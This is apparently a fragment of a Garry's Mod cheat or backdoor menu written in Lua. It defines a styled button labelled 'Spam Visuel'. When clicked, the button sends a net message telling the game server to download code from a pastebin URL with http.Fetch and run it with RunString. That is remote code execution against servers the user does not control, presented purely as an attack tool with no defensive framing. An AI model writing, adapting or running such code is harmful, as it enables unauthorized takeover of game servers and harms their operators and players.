local   hackbymood = vgui.Create( "DButton", BackgroundSupportPanel)
hackbymood:SetPos( 0, 90)
hackbymood:SetSize( 400, 30  )
hackbymood:SetText( "Spam Visuel" )
hackbymood.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if hackbymood:IsHovered() then
hackbymood:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
hackbymood:SetTextColor( Color(  255, 255, 255 ) )				
end
hackbymood.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/8LG646K2\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
end